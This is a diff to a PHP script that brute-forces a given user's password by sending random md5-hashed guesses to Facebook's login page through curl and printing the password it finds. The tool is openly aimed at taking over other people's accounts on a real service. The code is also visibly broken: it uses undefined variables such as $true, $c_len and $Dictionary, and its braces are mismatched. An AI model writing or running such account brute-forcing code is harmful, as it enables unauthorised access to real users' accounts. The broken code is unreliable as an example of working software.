@@ -14,12 +14,34 @@ function bruteForce($Pass1)
 {
 while(True)
 {     
-	$Pass = md5(rand(0, $Pass1));
+	$Pass = md5(rand(0, $c_len));
 
-	check_correct($Pass);
+	if(check_correct($username, $Pass)) {
+            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
+    <tr>
+        <td>
+            <div align='center'><b>Found the password of: ".$Dictionary[$Position]."<br> For the account: ".$username."</b></div>
+        </td>
+    </tr>
+</table>
+</body>
+</html>");
+        }
+    }
+    echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
+    <tr>
+        <td>
+            <div align='center'><b>Sorry... a password was not found for the account of <span class='alert'>".$username."</span> during the brute for
+ce attack.</b></div>
+        </td>
+    </tr>
+</table>";
+}
+echo "</body>
+</html>";
    }
 }
-function check_correct($Pass)
+function check_correct($username, $Pass)
 {
 	$c = curl_init('https://www.facebook.com/login');
         curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
@@ -32,7 +54,7 @@ function check_correct($Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "Startpagina") {return $Pass;}
+	if($str != "Startpagina") {return $true;}
         else {return false;}
 }
 bruteForce($Pass1);
